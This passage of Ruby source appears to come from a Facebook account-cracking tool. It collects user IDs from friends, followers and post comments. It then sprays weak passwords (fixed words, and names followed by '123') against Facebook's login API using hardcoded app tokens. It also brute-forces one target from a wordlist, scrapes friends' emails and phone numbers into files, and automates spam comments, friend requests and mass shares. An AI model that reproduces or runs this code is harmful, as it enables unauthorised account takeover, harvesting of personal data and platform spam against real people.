    b = JSON.parse(a)
    if b.key? ('error')
      puts ("\033[97m[+] Posts Not Found")
      print ("\n\033[91m[\033[92mBack\033[91m] ")
      gets
      Super()
    else
      puts ("\033[97m[+] Posted by #{b['from']['name']}")
      if b.key? ('comments')
        a = get("https://graph.facebook.com/#{id}/comments?summary=true&limit=#{$limits}&access_token=#{$token}")
        b = JSON.parse(a)
        id = b['data'].map {|i| i['id']}
        id = id.uniq
        puts ("\033[97m[+] Total Id #{id.length}")
        puts ("\033[97m[+] CRACK!")
        pool = Thread.pool($MaxProcess)
        puts ("\033[97m═"*52)
        id.map {|i| pool.process{main(i)}}
        pool.shutdown
        puts ("\033[97m═"*52)
        puts ("\033[92m[✓] Total OK : "+$ok.to_s)
        puts ("\033[93m[!] Total CP : "+$cp.to_s)
        print ("\n\033[91m[\033[92mBack\033[91m] ")
        gets
        Super()
      else
        puts ("\033[93m[+] No Comment")
        print ("\n\033[91m[\033[92mBack\033[91m] ")
        gets
        Super()
      end
    end
  elsif su == '5' or su == '05'
    begin
      system ('clear')
      puts ($logo)
      puts ("\033[97m═"*52)
      print ("\033[97m[+] Friend Id : ")
      temen = gets.chomp()
      x = get('https://graph.facebook.com/' + temen + '?access_token=' + $token)
      y = JSON.parse(x)
      puts ("\033[97m[+] Crack From: "+y['name'])
      a = get('https://graph.facebook.com/' + temen + '/friends?access_token=' + $token)
      b = JSON.parse(a)
      id = b['data'].map {|i| i['id']}
      tik ("\033[97m[+] Total Id  : "+id.length().to_s)
      puts ("\033[97m[!] CRACK!")
      pool = Thread.pool($MaxProcess)
      puts ("\033[97m═"*52)
      id.map {|i| pool.process{main(i)}}
      pool.shutdown
      puts ("\033[97m═"*52)
      puts ("\033[92m[✓] Total OK : "+$ok.to_s)
      puts ("\033[93m[!] Total CP : "+$cp.to_s)
      print ("\n\033[91m[\033[92mBack\033[91m] ")
      gets
      Super()
    rescue TypeError
      puts("\033[93m[!] Users Not Found")
      print ("\n\033[91m[\033[92mBack\033[91m] ")
      gets
      Hamker()
    end
  elsif su == '6' or su == '06'
    begin
      system ('clear')
      puts ($logo)
      puts ("\033[97m═"*52)
      print ("\033[97m[+] Friend id : ")
      id = gets.chomp()
      #puts ("\033[97m[+] Pleace Wait.....")
      a = get("https://graph.facebook.com/#{id}?fields=name,subscribers.limit(#{$limits}).summary(true)&access_token=#{$token}")
      b = JSON.parse(a)
      kosong = b['subscribers']['data'].empty?
      if kosong
        puts ("\033[93m[+] Account Has No Followers")
        print ("\n\033[91m[\033[92mBack\033[91m] ")
        gets
        Super()
      else
        id = b['subscribers']['data'].map {|i| i['id']}
        puts ("\033[97m[+] Crack From #{b['name']}")
        puts ("\033[97m[+] Total Followers #{b['subscribers']['summary']['total_count']}")
        puts ("\033[93m[!] You will only be cracking #{id.length} account") if b['subscribers']['summary']['total_count'] > id.length
        puts ("\033[97m[+] CRACK!")
        pool = Thread.pool($MaxProcess)
        puts ("\033[97m═"*52)
        id.map {|i| pool.process{main(i)}}
        pool.shutdown
        puts ("\033[97m═"*52)
        puts ("\033[92m[✓] Total OK : "+$ok.to_s)
        puts ("\033[93m[!] Total CP : "+$cp.to_s)
        print ("\n\033[91m[\033[92mBack\033[91m] ")
        gets
        Super()
      end
    rescue NoMethodError
      puts ("\033[93m[+] User Not Found")
      print ("\n\033[91m[\033[92mBack\033[91m] ")
      gets
      Super()
    end
  elsif su == '0' or su == '00'
    Hamker()
  else
    tik ("\033[93m[!] Invalid Input")
    sleep(0.9)
    Super()
  end
end

def main(id)
  File.open("super.txt","a") do |data|
    lanjut = true ; lanjut = false if id == $id
    pw1 = ["Sayang","Anjing","Bangsat","Kontol","Doraemon"]
    for pwd in pw1
      break if id == $id
      req = get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pwd + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
      parse = JSON.parse(req)
      if parse.include? ("access_token")
        $ok += 1
        data << "#{id} |  #{pwd}\n"
        puts ("\033[92m[OK] #{id} | #{pwd}")
        lanjut = false
        break
      elsif parse.include? ('error_msg') and parse['error_msg'].include?  ('www.facebook.com')
        $cp += 1
        data << "#{id} | #{pwd}\n"
        puts ("\033[93m[CP] #{id} | #{pwd}")
        lanjut = false
        break
      end
    end
    if lanjut
      a = get("https://graph.facebook.com/#{id}/?access_token=#{$token}")
      b = JSON.parse(a)
      name = ERB::Util.url_encode(b['name'])
      first = ERB::Util.url_encode(b['first_name'])
      last = ERB::Util.url_encode(b['last_name'])
      pw2 = [name + '123',name + '12345',first + '123',first + '12345',last + '123',last + '12345']
      for pwd in pw2
        params = {'access_token'=> '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32','format'=> 'JSON','sdk_version'=> '2','email'=> id,'locale'=> 'en_US','password'=> pwd,'sdk'=> 'ios','generate_session_cookies'=> '1','sig'=> '3f555f99fb61fcd7aa0c44f58f522ef6'}
        uri = URI("https://b-api.facebook.com/method/auth.login")
        uri.query = URI.encode_www_form(params)
        res = Net::HTTP.get_response(uri)
        parse = JSON.parse(res.body)
        if parse.include? ('access_token')
          $ok += 1
          data << "#{id} |  #{pwd}\n"
          puts ("\033[92m[OK] #{id} | #{pwd}")
          break
        elsif parse.include? ('error_msg') and parse['error_msg'].include?  ('www.facebook.com')
          $cp += 1
          data << "#{id} | #{pwd}\n"
          puts ("\033[93m[CP] #{id} | #{pwd}")
          break
        end
      end
    end
  end
end



def Brutal()
  system('clear')
  puts ($logo)
  puts ("\033[97m═"*52)
  print ("\033[91m[+] \033[92mId\033[97m/\033[92memail\033[97m/\033[92mPhone \033[97m(\033[92mTarget\033[97m) \033[91m:")
  target = gets.chomp()
  print ("\033[91m[+] \033[92mWordlist \033[97mext(list.txt) \033[91m: ")
  file = gets.chomp()
  if File.file? (file)
    password = File.readlines(file, chomp: true)
    puts ("\033[91m[\033[96m✓\033[91m] \033[92mTarget \033[91m: \033[97m" + target)
    puts ("\033[91m[+] \033[92mTotal \033[96m" + password.length.to_s + " \033[92mPassword ")
    puts ("\033[97m═"*52)
    for pw in password
      begin
        puts ("\033[91m[+] \033[92mLogin As \033[91m: \033[97m-> \033[92m%s \033[97m-> \033[92m%s" % [target, pw])
        a = get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + target + '&locale=en_US&password=' + pw + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
        b = JSON.parse(a)
        if b.include? ('access_token')
          puts ("\033[97m═"*52)
          puts ("\033[92m[✓] Success")
          puts ("\033[92m[✓] username : "+target)
          puts ("\033[92m[✓] password : "+pw)
          abort ("\033[91m[!] exit")
        elsif b.include? ('error_msg') and b['error_msg'].include?  ('www.facebook.com')
          puts ("\033[97m═"*52)
          puts ("\033[93m[!] Account Has Been Checkpoint")
          puts ("\033[92m[✓] username : "+target)
          puts ("\033[92m[✓] password : "+pw)
          abort ("\033[91m[!] exit")
        end
      rescue SocketError
        puts ("\033[91m[!] No Connection")
        sleep(0.5)
      rescue Errno::ETIMEDOUT
        puts ("\033[93m[!] Connection timed out")
        sleep(0.5)
      rescue Interrupt
        puts ("\n")
        break
      end
    end
    puts ("\033[97m═"*52)
    puts ("\033[91m[!] Sorry, opening password target failed :(")
    puts ("\033[91m[!] Try other method.")
    print ("\n\033[91m[\033[92mBack\033[91m] ")
    gets
    Hamker()
  else
    puts ("\033[93m[!] File Not Found")
    print ("\n\033[91m[\033[92mBack\033[91m] ")
    gets
    Hamker()
  end
end
 
def GetMenu()
  system('clear')
  puts ($logo)
  puts ("\033[97m═"*52)
  puts ("║-> \033[97m1. Get ID From Friends")
  puts ("║-> \033[97m2. Get Friends ID From Friends")
  puts ("║-> \033[97m3. Get Friends Email")
  puts ("║-> \033[97m4. Get Friends Email From Friends")
  puts ("║-> \033[97m5. Get Phone From Friends")
  puts ("║-> \033[97m6. Get Friend\s Phone From Friends")
  puts ("║-> \033[97m0. Back")
  print ("╚═\x1b[1;91m▶\x1b[1;97m ")
  top = gets.chomp()
  if top == '1' or top == '01'
    IdTemen()
  elsif top == '2' or top == '02'
    IdDariTemen()
  elsif top == '3' or top == '03'
    EmailTemen()
  elsif top == '4' or top == '04'
    EmailDariTemen()
  elsif top == '5' or top == '05'
    HpTemen()
  elsif top == '6' or top == '06'
    HpDariTemen()
  elsif top == '0' or top == '00'
    Hamker()
  else
    puts ("\033[93m[!] Invalid Input")
    sleep(1.5)
    GetMenu()
  end
end


def IdTemen()
  total = 0
  system('clear')
  puts ($logo)
  puts ("\033[97m═"*52)
  x = get('https://graph.facebook.com/me/friends?access_token=' + $token)
  y = JSON.parse(x)
  abort ("\033[93m[!] InValid Access Token") if y.include? ('error')
  print ("\033[97m[+] Save File (file.txt) : ")
  file = gets.chomp()
  file = "id.txt" if file == "" or file[0] == " "
  buka = File.open(file,"a")
  puts ("\033[97m═"*52)
  for i in y['data']
    buka.write(i["id"] + "\n")
    total += 1
    puts ("\033[92m[✓] Name : "+i['name'])
    puts ("\033[92m[✓] Id.  : "+i['id'])
    puts ("\033[97m═"*52)
  end
  buka.close()
  puts ("\033[92m[✓] Total Id : "+total.to_s)
  puts ("\033[92m[✓] File : "+File.basename(file))
  puts ("\033[92m[✓] File Path "+File.realpath(file))
  print ("\n\033[91m[\033[92mBack\033[91m] ")
  gets
  GetMenu()
end


def IdDariTemen()
  begin
    total = 0
    system('clear')
    puts ($logo)
    puts ("\033[97m═"*52)
    print ("\033[97m[+] Friend Id : ")
    temen = gets.chomp()
    x = get('https://graph.facebook.com/' + temen + '?access_token=' + $token)
    y = JSON.parse(x)
    if y.include? ('error') and y['error']['code']
      abort ("\033[91m[!] "+y['error']['message'])
    elsif y.include? ('error')
      puts ("\033[93m[+] User Not Found")
      print ("\n\033[91m[\033[92mBack\033[91m] ")
      gets
      GetMenu()
    else
      tik("\033[97m[+] From "+y['name'])
      x = get('https://graph.facebook.com/' + temen + '?fields=friends.limit(5000)&access_token=' + $token)
      y = JSON.parse(x)
      print ("\033[97m[+] Save File (file.txt) : ")
      file = gets.chomp()
      file = "Friend-Id.txt" if file == "" or file[0] == " "
      buka = File.open(file,"a")
      puts ("\033[97m═"*52)
      for i in y['friends']['data']
        buka.write(i["id"] + "\n")
        total += 1
        puts ("\033[92m[✓] Name : "+i['name'])
        puts ("\033[92m[✓] Id.  : "+i['id'])
        puts ("\033[97m═"*52)
      end
      buka.close()
      puts ("\033[92m[✓] Total Id : "+total.to_s)
      puts ("\033[92m[✓] File : "+File.basename(file))
      puts ("\033[92m[✓] File Path "+File.realpath(file))
      print ("\n\033[91m[\033[92mBack\033[91m] ")
      gets
      GetMenu()
    end
  rescue NoMethodError
    puts ("\033[93m[+] There are no friends on the account")
    print ("\n\033[91m[\033[92mBack\033[91m] ")
    gets
    GetMenu()
  end
end

def EmailTemen()
  total = 0
  system("clear")
  puts ($logo)
  puts ("\033[97m═"*52)
  x = get('https://graph.facebook.com/me/friends?access_token='+$token)
  y = JSON.parse(x)
  abort ("\033[93m[!] InValid Access Token") if y.include? ('error')
  print ("\033[97m[+] Save File (file.txt) : ")
  file = gets.chomp()
  file = "email.txt" if file == "" or file[0] == " "
  buka = File.open(file,"a")
  puts ("\033[97m═"*52)
  for i in y['data']
    a = get('https://graph.facebook.com/' + i['id'] + '?access_token=' + $token)
    b = JSON.parse(a)
    if b.include? ('email')
      buka.write(b['email'] + "\n")
      total += 1
      puts ("\033[92m[✓] Name : "+i['name'])
      puts ("\033[92m[✓] email: "+b['email'])
      puts ("\033[97m═"*52)
    end
  end
  buka.close()
  puts ("\033[92m[✓] Total email : "+total.to_s)
  puts ("\033[92m[✓] File : "+File.basename(file))
  puts ("\033[92m[✓] File Path "+File.realpath(file))
  print ("\n\033[91m[\033[92mBack\033[91m] ")
  gets
  GetMenu()
end

def EmailDariTemen()
  begin
    total = 0
    system('clear')
    puts ($logo)
    puts ("\033[97m═"*52)
    print ("\033[97m[+] Friend Id : ")
    temen = gets.chomp()
    x = get('https://graph.facebook.com/' + temen + '?access_token=' + $token)
    y = JSON.parse(x)
    if y.include? ('error') and y['error']['code']
      abort ("\033[91m[!] Invalid Access Token")
    elsif y.include? ('error')
      puts ("\033[93m[+] User Not Found")
      print ("\n\033[91m[\033[92mBack\033[91m] ")
      gets
      GetMenu()
    else
      tik("\033[97m[+] From "+y['name'])
      x = get('https://graph.facebook.com/' + temen + '?fields=friends.limit(5000)&access_token=' + $token)
      y = JSON.parse(x)
      print ("\033[97m[+] Save File (file.txt) : ")
      file = gets.chomp()
      file = "Friend-email.txt" if file == "" or file[0] == " "
      buka = File.open(file,"a")
      puts ("\033[97m═"*52)
      for i in y['friends']['data']
        a = get('https://graph.facebook.com/' + i['id'] + '?access_token=' + $token)
        b = JSON.parse(a)
        if b.include? ('email')
          buka.write(b['email'] + "\n")
          total += 1
          puts ("\033[92m[✓] Name : "+i['name'])
          puts ("\033[92m[✓] email: "+b['email'])
          puts ("\033[97m═"*52)
        end
      end
      buka.close()
      puts ("\033[92m[✓] Total email : "+total.to_s)
      puts ("\033[92m[✓] File : "+File.basename(file))
      puts ("\033[92m[✓] File Path "+File.realpath(file))
      print ("\n\033[91m[\033[92mBack\033[91m] ")
      gets
      GetMenu()
    end
  rescue NoMethodError
    puts ("\033[93m[+] There are no friends on the account")
    print ("\n\033[91m[\033[92mBack\033[91m] ")
    gets
    GetMenu()
  end
end

def HpTemen()
  total = 0
  system("clear")
  puts ($logo)
  puts ("\033[97m═"*52)
  x = get('https://graph.facebook.com/me/friends?access_token='+$token)
  y = JSON.parse(x)
  abort ("\033[93m[!] InValid Access Token") if y.include? ('error')
  print ("\033[97m[+] Save File (file.txt) : ")
  file = gets.chomp()
  file = "MobilePhone.txt" if file == "" or file[0] == " "
  buka = File.open(file,"a")
  puts ("\033[97m═"*52)
  for i in y['data']
    a = get('https://graph.facebook.com/' + i['id'] + '?access_token=' + $token)
    b = JSON.parse(a)
    if b.include? ('mobile_phone')
      buka.write(b['mobile_phone'] + "\n")
      total += 1
      puts ("\033[92m[✓] Name : "+i['name'])
      puts ("\033[92m[✓] phone: "+b['mobile_phone'])
      puts ("\033[97m═"*52)
    end
  end
  buka.close()
  puts ("\033[92m[✓] Total phone : "+total.to_s)
  puts ("\033[92m[✓] File : "+File.basename(file))
  puts ("\033[92m[✓] File Path "+File.realpath(file))
  print ("\n\033[91m[\033[92mBack\033[91m] ")
  gets
  GetMenu()
end

def HpDariTemen()
  begin
    total = 0
    system('clear')
    puts ($logo)
    puts ("\033[97m═"*52)
    print ("\033[97m[+] Friend Id : ")
    temen = gets.chomp()
    x = get('https://graph.facebook.com/' + temen + '?access_token=' + $token)
    y = JSON.parse(x)
    if y.include? ('error') and y['error']['code']
      abort ("\033[91m[!] Invalid Access Token")
    elsif y.include? ('error')
      puts ("\033[93m[+] User Not Found")
      print ("\n\033[91m[\033[92mBack\033[91m] ")
      gets
      GetMenu()
    else
      tik("\033[97m[+] From "+y['name'])
      x = get('https://graph.facebook.com/' + temen + '?fields=friends.limit(5000)&access_token=' + $token)
      y = JSON.parse(x)
      print ("\033[97m[+] Save File (file.txt) : ")
      file = gets.chomp()
      file = "Friend-phone.txt" if file == "" or file[0] == " "
      buka = File.open(file,"a")
      puts ("\033[97m═"*52)
      for i in y['friends']['data']
        a = get('https://graph.facebook.com/' + i['id'] + '?access_token=' + $token)
        b = JSON.parse(a)
        if b.include? ('mobile_phone')
          buka.write(b['mobile_phone'] + "\n")
          total += 1
          puts ("\033[92m[✓] Name : "+i['name'])
          puts ("\033[92m[✓] phone: "+b['mobile_phone'])
          puts ("\033[97m═"*52)
        end
      end
      buka.close()
      puts ("\033[92m[✓] Total phone: "+total.to_s)
      puts ("\033[92m[✓] File : "+File.basename(file))
      puts ("\033[92m[✓] File Path "+File.realpath(file))
      print ("\n\033[91m[\033[92mBack\033[91m] ")
      gets
      GetMenu()
    end
  rescue NoMethodError
    puts ("\033[93m[+] There are no friends on the account")
    print ("\n\033[91m[\033[92mBack\033[91m] ")
    gets
    GetMenu()
  end
end
   
def Bot()
  system("clear")
  puts ($logo)
  puts ("Welcome To Bot Menu :)")
  puts ("\033[97m═"*52)
  puts ("\033[97m║-> \x1b[1;37;40m1. Post Reaction")
  puts ("\033[97m║-> \x1b[1;37;40m2. Post comments")
  puts ("\033[97m║-> \x1b[1;37;40m3. Add Friend")
  puts ("\033[97m║-> \x1b[1;37;40m4. Follow")
  puts ("\033[97m║-> \x1b[1;37;40m5. Share Post")
  puts ("\033[97m║-> \x1b[1;37;40m6. Delete Post")
  puts ("\033[97m║-> \x1b[1;37;40m7. Unfriends")
  puts ("\033[97m║-> \x1b[1;37;40m8. Unfollow")
  puts ("\033[97m║-> \x1b[1;32;40m0. Back")
  puts ("\x1b[1;37;40m║")
  print ("╚═\x1b[1;91m▶\x1b[1;97m ")
  bots = gets.chomp()
  if bots == '1' or bots == '01'
    ReactPostMenu()
  elsif bots == '2' or bots == '02'
    CommentPostMenu()
  elsif bots == '3' or bots == '03'
    AddFriendMenu()
  elsif bots == '4' or bots == '04'
    FollowMenu()
  elsif bots == '5' or bots == '05'
    system('clear')
    puts ($logo)
    puts ("\033[97m═"*52)
    print ("\033[97m[+] Post Id : ")
    id = gets.chomp() ; id = id.tr(" ","")
    req = get("https://graph.facebook.com/#{id}?fields=from,id&access_token=#{$token}")
    res = JSON.parse(req)
    if not res.key? ('id')
      puts ("\033[93m[+] Posts Not Found")
    else
      SharePostMenu(link = "https://www.facebook.com/#{res['id']}")
    end
    print ("\n\033[91m[\033[92mBack\033[91m] ")
    gets
    Bot()
  elsif bots == '6' or bots == '06'
    DeleteAllPost()
  elsif bots == '7' or bots == '07'
    Unfriend()
  elsif bots == '8' or bots == '08'
    unfollow()
  elsif bots == '0' or bots == '00'
    menu()
  else
    puts ("\033[93m[!] Invalid Input")
    sleep(0.9)
    Bot()
  end
end

def ReactPostMenu()
  system("clear")
  puts ($logo)
  puts ("\033[97m═"*52)
  puts ("\033[97m║-> \x1b[1;37;40m1. Target Post Reaction")
  puts ("\033[97m║-> \x1b[1;37;40m2. Group Post Reactions")
  puts ("\033[97m║-> \x1b[1;37;40m3. Random Target Post Reaction")
  puts ("\033[97m║-> \x1b[1;37;40m4. Random Group Post Reaction")
  puts ("\033[97m║-> \x1b[1;32;40m0. Back")
  puts ("\x1b[1;37;40m║")
  print ("╚═\x1b[1;91m▶\x1b[1;97m ")
  mana = gets.chomp()
  if mana == '1' or mana == '01'
    ReactPost()
  elsif mana == '2' or mana == '02'
    ReactGruop()
  elsif mana == '3' or mana == '03'
    ReactPostRandom()
  elsif mana == '4' or mana == '04'
    ReactGruopRandom()
  elsif mana == '0' or mana == '00'
    Bot()
  else
    puts ("\033[93m[!] Invalid Input")
    sleep(0.9)
    ReactPostMenu()
  end
end

def CommentPostMenu()
  system("clear")
  puts ($logo)
  puts ("\033[97m═"*52)
  puts ("\033[97m║-> \x1b[1;37;40m1. Comment Target Post")
  puts ("\033[97m║-> \x1b[1;37;40m2. Comment Group Post")
  puts ("\033[97m║-> \x1b[1;37;40m3. Spam Comment")
  puts ("\033[97m║-> \x1b[1;32;40m0. Back")
  puts ("\x1b[1;37;40m║")
  print ("╚═\x1b[1;91m▶\x1b[1;97m ")
  mana = gets.chomp()
  if mana == '1' or mana == '01'
    CommentPost()
  elsif mana == '2' or mana == '02'
    CommentGroup()
  elsif mana == '3' or mana == '03'
    SpamComment()
  elsif mana == '0' or mana == '00'
    Bot()
  else
    puts ("\033[93m[!] Invalid Input")
    sleep(0.9)
    CommentPostMenu()
  end
end

def AddFriendMenu()
  system("clear")
  puts ($logo)
  puts ("\033[97m═"*52)
  puts ("\033[97m║-> \x1b[1;37;40m1. Add Friend From Target Id")
  puts ("\033[97m║-> \x1b[1;37;40m2. Add Friend From Friend")
  puts ("\033[97m║-> \x1b[1;37;40m3. Add Friend From File Id")
  puts ("\033[97m║-> \x1b[1;32;40m0. Back")
  puts ("\x1b[1;37;40m║")
  print ("╚═\x1b[1;91m▶\x1b[1;97m ")
  mana = gets.chomp()
  if mana == '1' or mana == '01'
    AddTarget()
  elsif mana == '2' or mana == '02'
   AddFriends()
  elsif mana == '3' or mana == '03'
   AddFile()
  elsif mana == '0' or mana == '00'
    Bot()
  else
    puts ("\033[93m[!] Invalid Input")
    sleep(0.9)
    AddFriendMenu()
  end
end

def FollowMenu()
  system("clear")
  puts ($logo)
  puts ("\033[97m═"*52)
  puts ("\033[97m║-> \x1b[1;37;40m1. Follow target Id")
  puts ("\033[97m║-> \x1b[1;37;40m2. Follow all friend")
  puts ("\033[97m║-> \x1b[1;37;40m3. Follow Friend from Friend")
  puts ("\033[97m║-> \x1b[1;37;40m4. Follow From File Id")
  puts ("\033[97m║-> \x1b[1;32;40m0. Back")
  puts ("\x1b[1;37;40m║")
  print ("╚═\x1b[1;91m▶\x1b[1;97m ")
  mana = gets.chomp()
  if mana == '1' or mana == '01'
    FolowTarget()
  elsif mana == '2' or mana == '02'
   FolowAll()
  elsif mana == '3' or mana == '03'
   FolowFromFriend()
  elsif mana == '4' or mana == '04'
    FolowFromFile()
  elsif mana == '0' or mana == '00'
    Bot()
  else
    puts ("\033[93m[!] Invalid Input")
    sleep(0.9)
    FollowMenu()
  end
end

def SharePostMenu(link)
  total = 0
  system('clear')
  puts ($logo)
  puts ("\033[97m═"*52)
  puts ("\033[97m║-> \x1b[1;37;40m1. Share To Facebook")
  puts ("\033[97m║-> \x1b[1;37;40m2. Share on a Friend's Timeline")
  puts ("\033[97m║-> \x1b[1;37;40m3. Share on a Page")
  puts ("\033[97m║-> \x1b[1;37;40m4. Share in WhatsApp")
  #puts ("\033[97m║-> \x1b[1;32;40m0. Back")
  puts ("\x1b[1;37;40m║")
  print ("╚═\x1b[1;91m▶\x1b[1;97m ")
  mana = gets.chomp()
  if mana == '1' or mana == '01'
    system('clear')
    puts ($logo)
    puts ("\033[97m[!] Use <> For New Line")
    puts ("\033[97m═"*52)
    print ("\033[97m[+] Message : ")
    msg = gets.chomp()
    msg = msg.tr("<>","\n")
    req = get("https://graph.facebook.com/me/feed?method=POST&link=#{link}&message=#{msg}&access_token=#{$token}")
    res = JSON.parse(req)
    if res.key? ('id')
      puts ("\033[92m[✓] Success : #{res['id']}")
    else
      puts ("\033[93m[!] Failed  : nil")
    end
  elsif mana == '2' or mana == '02'
    system('clear')
    puts ($logo)
    puts ("\033[97m[!] Use <> For New Line")
    puts ("\033[97m═"*52)
    print ("\033[97m[+] Message : ")
    msg = gets.chomp()
    msg = msg.tr("<>","\n")
    print ("\033[97m[+] Limit (\033[92mMax \033[91m#{$limits}\033[97m) : ")
    limit = gets.to_i
    a = get("https://graph.facebook.com/me/friends?fields=id,name&limit=#{limit}&access_token=#{$token}")
    b = JSON.parse(a)
    if not b.key? ("data")
      abort ("\033[91m[!] Error")
    elsif b['data'].empty?
      puts ("\033[93m[+] Your Account Has No Friends")
    else
      puts ("\033[97m[+] CTRL + C TO STOP")
      puts ("\033[97m[+] Pleace Wait...")
      puts ("\033[97m═"*52)
      for i in b['data']
        begin
          nama = i['name']
          id = i['id']
          req = get("https://graph.facebook.com/#{id}/feed?method=POST&link=#{link}&message=#{msg}&access_token=#{$token}")
          res = JSON.parse(req)
          if res.key? ("id")
            total += 1
            puts ("\033[92m[✓] Success : #{nama} --> #{id}")
          else
            puts ("\033[93m[!] Failed  : #{nama} --> #{id}")
          end
          sleep(0.2)
        rescue SocketError
          puts ("\033[91m[!] No Connection")
          sleep(0.9)
        rescue Interrupt
          puts ("\n") ; break
        end
      end
      puts ("\033[97m═"*52)
      puts ("\033[92m[✓] Finish #{total}")
    end
  elsif mana == '3' or mana == '03'
    system('clear')
    puts($logo)
    puts ("\033[97m[!] Use <> For New Line")
    puts ("\033[97m═"*52)
    print ("\033[97m[+] Message : ")
    msg = gets.chomp()
    msg = msg.tr("<>","\n")
    print ("\033[97m[+] Limit : ")
    limit = gets.to_i
    a = get("https://graph.facebook.com/"+ $id + "/accounts?fields=name,access_token&limit=#{limit}&access_token="+$token)
    b = JSON.parse(a)
    if not b.key? ("data")
      abort ("\033[91m[!] Error")
    elsif b['data'].empty?
      puts ("\033[93m[+] Your Account Doesn't Have a Page")
    else
      puts ("\033[97m[+] CTRL + C TO STOP")
      puts ("\033[97m[+] Pleace Wait...")
      puts ("\033[97m═"*52)
      for i in b['data']
        begin
          nama = i['name']
          id = i['id']
          token = i['access_token']
          req = get("https://graph.facebook.com/#{id}/feed?method=POST&link=#{link}&message=#{msg}&access_token=#{token}")
          res = JSON.parse(req)
          if res.key? ("id")
            total += 1
            puts ("\033[92m[✓] Success : #{nama} --> #{id}")
          else
            puts ("\033[93m[!] Failed  : #{nama} --> #{id}")
          end
          sleep(0.2)
        rescue SocketError
          puts ("\033[91m[!] No Connection")
          sleep(0.9)
        rescue Interrupt
          puts ("\n") ; break
        end
      end
      puts ("\033[97m═"*52)
      puts ("\033[92m[✓] Finish #{total}")
    end
  elsif mana == '4' or mana == '04'
    system('clear')
    puts ($logo)
    puts ("\033[97m═"*52)
    sukses = system("xdg-open --chooser whatsapp://send?text=#{link}")
    if sukses
      puts ("\033[92m[✓] Successfully Opening the WhatsApp Application")
    else#81FF00
      puts ("\033[93m[+] Failed to Open the WhatsApp Application")
    end
  else
    puts ("\033[93m[+] Invalid Input")
  end
end

